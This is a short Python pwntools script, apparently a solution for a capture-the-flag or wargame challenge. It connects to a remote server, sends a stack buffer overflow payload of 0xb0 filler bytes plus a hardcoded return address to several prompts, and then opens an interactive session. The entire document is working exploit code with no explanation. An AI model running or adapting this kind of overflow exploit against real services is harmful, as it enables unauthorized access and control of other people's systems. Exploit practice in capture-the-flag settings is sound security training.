from pwn import *

p = remote("srv1.kitriwhs.kr", 20445)

gadget = b''
gadget += p64(0x55555555526e)

payload = b"A" * 0xb0 + gadget

#p.sendline(payload)
#p.sendline(payload)
p.sendline(b"0")

p.sendlineafter("1: ", payload)
p.sendline(payload)

p.sendlineafter("2: ", payload)
p.sendline(payload)

p.sendlineafter("3: ", payload)
p.sendline(payload)

p.interactive()

